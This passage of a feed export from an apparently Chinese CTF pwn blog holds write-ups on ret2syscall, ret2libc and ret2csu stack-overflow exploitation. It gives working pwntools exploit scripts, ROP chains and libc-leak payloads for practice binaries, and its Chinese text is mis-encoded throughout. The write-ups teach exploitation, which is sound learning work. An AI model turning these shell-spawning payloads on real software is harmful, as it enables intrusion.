class="comment"># 0x0805466b: mov dword ptr [edx], eax; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x00070016</span>) <span class="comment"># 0x080b8016: pop eax; ret; </span></span><br><span class="line">rop += p32(<span class="number">0x00000000</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00026cda</span>) <span class="comment"># 0x0806ecda: pop edx; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x000a2068</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000c66b</span>) <span class="comment"># 0x0805466b: mov dword ptr [edx], eax; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x000001c9</span>) <span class="comment"># 0x080481c9: pop ebx; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x000a2060</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00096769</span>) <span class="comment"># 0x080de769: pop ecx; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x000a2068</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00026cda</span>) <span class="comment"># 0x0806ecda: pop edx; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x000a2068</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00070016</span>) <span class="comment"># 0x080b8016: pop eax; ret; </span></span><br><span class="line">rop += p32(<span class="number">0x0000000b</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00027430</span>) <span class="comment"># 0x0806f430: int 0x80; ret; </span></span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line"><span class="built_in">print</span>(rop)</span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x05ret2libc"><a href="#0x05ret2libc" class="headerlink" title="0x05ret2libc"></a>0x05ret2libc</h1><p><strong>ret2libcå³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œlibcä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„plt å¤„<em>(å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°)</em>æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½®ï¼Œå³å‡½æ•°å¯¹åº”çš„got è¡¨é¡¹çš„å†…å®¹(ç¬¬ä¸€æ¬¡æ‰§è¡Œçš„å‡½æ•°)ã€‚</strong></p><h2 id="è§£æé¢˜ç›®-jarvisoj-level1-1"><a href="#è§£æé¢˜ç›®-jarvisoj-level1-1" class="headerlink" title="è§£æé¢˜ç›® jarvisoj_level1"></a>è§£æé¢˜ç›® jarvisoj_level1</h2><h3 id="ä¸ªäººåˆ†æ-3"><a href="#ä¸ªäººåˆ†æ-3" class="headerlink" title="ä¸ªäººåˆ†æ"></a>ä¸ªäººåˆ†æ</h3><p>æ‰§è¡Œwriteå‡½æ•°æ³„éœ²read_gotè¡¨ =&gt; å†é€šè¿‡readåœ¨libcçš„offsetå¾—å‡ºlibc_base =&gt; æ ¹æ®libc_baseå¾—å‡ºsystemå‡½æ•°å’Œâ€œ/bin/shâ€çš„çœŸå®åœ°å€ =&gt; è¿”å›åˆ°mainä¸»å‡½æ•°å†æ¬¡æ‰§è¡Œ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main()å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">vulnerable_function</span>();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerable_function()</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p?\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³„éœ²çœŸå®åœ°å€æ—¶ï¼Œpayload1ä¸­<code>p32(main_addr)</code>è¿”å›åœ°å€è¦æ˜¯ä¸»å‡½æ•°mainæ‰èƒ½å†æ¬¡æ‰§è¡Œmainï¼Œåé¢æ‰èƒ½å‘é€payload2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = b&#x27;A&#x27;*0x88+b&#x27;B&#x27;*0x4+p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(4)</span><br></pre></td></tr></table></figure><p>è€Œpayload2ä¸­<code>p32(main_addr)</code>å¯ä»¥ä»»æ„æ”¹åŠ¨ï¼Œæ¯”å¦‚<code>p32(4)</code>æˆ–è€…<code>â€˜bâ€™*4</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 =  b&#x27;A&#x27;*0x88+b&#x27;B&#x27;*0x4+p32(system)+p32(main_addr)+p32(binsh)</span><br></pre></td></tr></table></figure><p><strong>pythonä¸­lambdaè¡¨è¾¾å¼çš„ç”¨æ³•ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è‡ªå®šä¹‰åŒ¿åå‡½æ•°ï¼šfunc = lambda x : x**2</span><br><span class="line">è°ƒç”¨ï¼šfunc(2)</span><br><span class="line">è¾“å‡ºï¼š4</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_path=<span class="string">&#x27;./level1&#x27;</span></span><br><span class="line">p = process(file_path)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######################################common pack#######################################</span></span><br><span class="line"><span class="comment"># pythonçš„åŒ¿åå‡½æ•°</span></span><br><span class="line">su  = <span class="keyword">lambda</span> desp,value:success(desp+<span class="string">&#x27; =&gt; &#x27;</span>+(<span class="built_in">hex</span>(value) <span class="keyword">if</span> <span class="built_in">type</span>(value)==<span class="built_in">int</span> <span class="keyword">else</span> <span class="built_in">str</span>(value)))</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim            :p.recvuntil(delim)</span><br><span class="line">rv  = <span class="keyword">lambda</span> count=<span class="number">1024</span>,timeout=<span class="number">0</span>:p.recv(count,timeout)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data             :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data       :p.sendlineafter(delim, data)</span><br><span class="line">ss  = <span class="keyword">lambda</span> data             :p.send(data)</span><br><span class="line">ssa = <span class="keyword">lambda</span> delim,data       :p.sendafter(delim, data)</span><br><span class="line">u64leak=<span class="keyword">lambda</span> :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">u64leak2=<span class="keyword">lambda</span> :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment">######################################common pack#######################################</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080484B7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------payloadéƒ¨åˆ†--------------#         </span></span><br><span class="line"><span class="comment">#å› ä¸ºå‰é¢å·²ç»æ‰§è¡Œè¿‡read æ‰€ä»¥ä¼šåŒ…å«readçš„çœŸå®åœ°å€#</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)<span class="comment">#æ‰§è¡Œwrite æ³„éœ²read_gotè¡¨</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x080484B5&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&quot;?&quot;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&quot;read_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_addr)))</span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>] <span class="comment">#é€šè¿‡readåœ¨libcçš„åç§»æ‰¾åˆ°libcçš„åŸºåœ°å€</span></span><br><span class="line">system = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]            <span class="comment">#é€šè¿‡libcçš„åŸºåœ°å€æ‰¾åˆ°systemå‡½æ•°çš„åœ°å€å’Œbin/shçš„åœ°å€</span></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;system:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system)))</span><br><span class="line">log.success(<span class="string">&quot;binsh:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(binsh)))</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4</span>+p32(system)+p32(main_addr)+p32(binsh) <span class="comment">#å†æ¬¡è§¦å‘å è¦†ç›–ä¸ºsystem + bin/shåœ°å€</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x06-ret2csu"><a href="#0x06-ret2csu" class="headerlink" title="0x06 ret2csu"></a>0x06 ret2csu</h1><p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ gadgetsã€‚ ret2csuæ˜¯é’ˆå¯¹64ä½ç¨‹åºçš„</p><h2 id="ä¾‹é¢˜è§£æ-level5"><a href="#ä¾‹é¢˜è§£æ-level5" class="headerlink" title="ä¾‹é¢˜è§£æ level5"></a>ä¾‹é¢˜è§£æ level5</h2><h3 id="ä¸ªäººåˆ†æ-4"><a href="#ä¸ªäººåˆ†æ-4" class="headerlink" title="ä¸ªäººåˆ†æ"></a>ä¸ªäººåˆ†æ</h3><p>1.åˆ©ç”¨write(1, write_got, 8)æ³„éœ²libc =&gt; 2.åˆ©ç”¨read(0, bss, 16)å†™å…¥systemåœ°å€å’Œ/bin/shå­—ç¬¦ä¸²</p><p> =&gt; 3.system(â€˜/bin/shâ€™) get shell</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">r12, r13, r14, r15, last</span>):</span><br><span class="line">payload = offset * <span class="string">&#x27;a&#x27;</span>  </span><br><span class="line"><span class="comment">#æ„é€ æ ˆæº¢å‡ºçš„padding</span></span><br><span class="line">payload += p64(first_csu) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>    </span><br><span class="line"><span class="comment">#gadgets1çš„åœ°å€</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#rbx=0, rbp=1</span></span><br><span class="line">payload += p64(r12) <span class="comment"># æ¯”å¦‚pust_plt</span></span><br><span class="line"><span class="comment">#callè°ƒç”¨çš„åœ°å€</span></span><br><span class="line">payload += p64(r15) + p64(r14) + p64(r13)<span class="comment"># è‹¥ä¸ºputs_got 0 0ï¼Œåˆ™ç­‰ä»·ä¸ºputs(puts_got)</span></span><br><span class="line"><span class="comment"># Ubuntu16çš„payloadï¼špayload += p64(r13) +ã€€p64(r14) +p64(r15)</span></span><br><span class="line">    <span class="comment">#ä¸‰ä¸ªå‚æ•°çš„å¯„å­˜å™¨</span></span><br><span class="line">payload += p64(second_csu)</span><br><span class="line"><span class="comment">#gadgets2çš„åœ°å€</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line"><span class="comment">#popå‡ºçš„padding</span></span><br><span class="line">payload += p64(last)</span><br><span class="line"><span class="comment">#å‡½æ•°æœ€åçš„è¿”å›åœ°å€</span></span><br><span class="line"><span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=process(&#x27;./level5&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">csu_one=0x400606 </span><br><span class="line">csu_two=0x4005F0</span><br><span class="line">bss=0x601028</span><br><span class="line"></span><br><span class="line">def ret_csu(r12, r13, r14, r15, last):</span><br><span class="line">payload=&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload += p64(csu_one)</span><br><span class="line">payload += p64(0) + p64(1)</span><br><span class="line">payload += p64(r12)</span><br><span class="line">payload += p64(r15) + p64(r14) + p64(r13) # rdx,rsi,rdi</span><br><span class="line">payload += p64(csu_two)# bsså¡«å……åˆ°è¿™æ˜¯bss+72çš„ä½ç½®ï¼Œè¿™é‡Œæ˜¯è§¦å‘ç‚¹</span><br><span class="line">payload += p64(last)</span><br><span class="line">return payload</span><br></pre></td></tr></table></figure><h1 id="0x07-æ€»ç»“"><a href="#0x07-æ€»ç»“" class="headerlink" title="0x07 æ€»ç»“"></a>0x07 æ€»ç»“</h1><p><strong>ret2XXæ˜¯æ ¹æ®ROPçš„gadgetsçš„æ¥æºè¿›è¡Œåˆ†ç±»ã€‚</strong></p><p><strong>1.ret2textæ˜¯åˆ©ç”¨ç¨‹åºæœ¬èº«çš„gadgets</strong></p><p><strong>2.ret2shellcodeæ˜¯åˆ©ç”¨è¾“å…¥çš„shellcode</strong></p><p><strong>3.ret2syscallæ˜¯åˆ©ç”¨syscallçš„gadgets</strong></p><p><strong>4.ret2libcæ˜¯åˆ©ç”¨libcå½“ä¸­å­˜åœ¨çš„gadgets</strong></p><p><strong>5.ret2csuæ˜¯ç¨‹åºç¼–è¯‘æ—¶å­˜åœ¨çš„gadgetå…·æœ‰é€šç”¨æ€§</strong></p><h1 id="0x08ç‰¹åˆ«è¯´æ˜"><a href="#0x08ç‰¹åˆ«è¯´æ˜" class="headerlink" title="0x08ç‰¹åˆ«è¯´æ˜"></a>0x08ç‰¹åˆ«è¯´æ˜</h1><p>é¢˜ç›®å…¨åœ¨æœ¬åœ°Ubuntu18æ‰“ï¼Œé¢˜ç›®æ¥æºæ˜Ÿç›Ÿ</p><p>å‚è€ƒCSDNï¼š<a href="http://t.csdn.cn/I5pqB">http://t.csdn.cn/I5pqB</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01é¢„å¤‡çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x01é¢„å¤‡çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x01é¢„å¤‡çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x01é¢„å¤‡çŸ¥è¯†&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;*bssæ®µ&lt;/strong&gt;é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­æœª&lt;strong&gt;åˆå§‹åŒ–çš„</summary>
      
    
    
    
    <category term="ç©è½¬PWN" scheme="https://pwnling.github.io/categories/%E7%8E%A9%E8%BD%ACPWN/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2libc</title>
    <link href="https://pwnling.github.io/2022/12/04/7-ret2libc/"/>
    <id>https://pwnling.github.io/2022/12/04/7-ret2libc/</id>
    <published>2022-12-04T14:00:00.000Z</published>
    <updated>2022-12-04T14:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ/bin/shâ€)ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚</p><p>å½“ç¨‹åºçš„NX enableå¼€å¯ï¼Œå†™å…¥shellcodeæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œåˆæˆ–è€…ç¨‹åºå¼€æœ‰ASLRä¿æŠ¤ï¼ˆéšæœºåœ°å€ï¼‰ï¼Œæ¯æ¬¡æ‰§è¡Œç¨‹åºæƒ³åˆ©ç”¨çš„å‡½æ•°åœ°å€éƒ½æ˜¯å˜åŒ–çš„æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘ç”¨libcé‡Œçš„å‡½æ•°åŠ¨æ€å¾—åˆ°systemå‡½æ•°åœ°å€ä¸/bin/shå­—ç¬¦ä¸²åœ°å€</p><h3 id="step1-32bit-or-64bit"><a href="#step1-32bit-or-64bit" class="headerlink" title="step1 32bit or 64bit?"></a>step1 32bit or 64bit?</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret2libc1$ file ret2libc1</span><br><span class="line">ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h3 id="step2-checksec"><a href="#step2-checksec" class="headerlink" title="step2 checksec"></a>step2 checksec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ret2libc1$ checksec ret2libc1</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/æ¡Œé¢/(5)retlibc/ret2libc1/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="step3-IDA32"><a href="#step3-IDA32" class="headerlink" title="step3 IDA32"></a>step3 IDA32</h3><p>å­˜åœ¨æ ˆæº¢å‡ºå±é™©å‡½æ•°gets( )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³•ä¸€ï¼šåœ¨å‡½æ•°çª—å£å‘ç°_systemå‡½æ•°ï¼Œç‚¹å‡»+ç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460 _system         proc near               ; CODE XREF: secure+44â†“p</span><br><span class="line">.plt:08048460</span><br><span class="line">.plt:08048460 command         = dword ptr  4</span><br><span class="line">.plt:08048460</span><br><span class="line">.plt:08048460                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048460 _system         endp</span><br></pre></td></tr></table></figure><p>æ³•äºŒï¼šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾åœ°å€ï¼Œä½¿ç”¨å‘½ä»¤å‰åº”è¿›è¡Œå¦‚ä¸‹æ­¥éª¤ï¼šgdb ret2libc1 â€”&gt; b main â€”&gt; r â€”&gt; objdump -d ret2libc1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ret2libc1</span><br><span class="line"></span><br><span class="line">å‘½ä»¤ä»‹ç»ï¼š</span><br><span class="line">objdump -d &lt;.elf&gt;</span><br><span class="line">åæ±‡ç¼–<span class="built_in">test</span>ä¸­çš„éœ€è¦æ‰§è¡ŒæŒ‡ä»¤çš„é‚£äº›section</span><br><span class="line"></span><br><span class="line">objdump -D &lt;.elf&gt;</span><br><span class="line">ä¸-dç±»ä¼¼ï¼Œä½†åæ±‡ç¼–<span class="built_in">test</span>ä¸­çš„æ‰€æœ‰section</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">08048450 &lt;puts@plt&gt;:</span><br><span class="line"> 8048450:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 8048456:68 10 00 00 00       push   $0x10</span><br><span class="line"> 804845b:e9 c0 ff ff ff       jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048460 &lt;system@plt&gt;:</span><br><span class="line"> 8048460:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 8048466:68 18 00 00 00       push   $0x18</span><br><span class="line"> 804846b:e9 b0 ff ff ff       jmp    8048420 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><p><strong>sys_addr = 08048460</strong></p><p>æ³•ä¸€ï¼šshfit+F12</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804815400000013C/lib/ld-linux.so.2</span><br><span class="line">LOAD:080482B90000000AClibc.so.6</span><br><span class="line">LOAD:080482C30000000FC_IO_stdin_used</span><br><span class="line">LOAD:080482D700000006Csrand</span><br><span class="line">LOAD:080482DD0000000FC__isoc99_scanf</span><br><span class="line">LOAD:080482F600000006Cstdin</span><br><span class="line">LOAD:080482FC00000007Cstdout</span><br><span class="line">LOAD:0804830300000007Csystem</span><br><span class="line">LOAD:0804830A00000008Csetvbuf</span><br><span class="line">LOAD:0804831200000012C__libc_start_main</span><br><span class="line">LOAD:080483240000000FC__gmon_start__</span><br><span class="line">LOAD:080483330000000ACGLIBC_2.7</span><br><span class="line">LOAD:0804833D0000000ACGLIBC_2.0</span><br><span class="line">.rodata:0804872000000008C/bin/sh</span><br><span class="line">.rodata:0804872B00000008Cshell!?</span><br><span class="line">.rodata:080487330000000DCRET2LIBC &gt;_&lt;</span><br><span class="line">.eh_frame:080487AB00000005C;*2$\&quot;</span><br></pre></td></tr></table></figure><p>æ³•äºŒï¼šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">ret2libc1       0x8048720 das     /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">ret2libc1       0x8049720 <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">libc-2.31.so    0xf7f5d352 <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>bin_sh = 08048720</strong></p><h3 id="step4-exp"><a href="#step4-exp" class="headerlink" title="step4 exp"></a>step4 exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 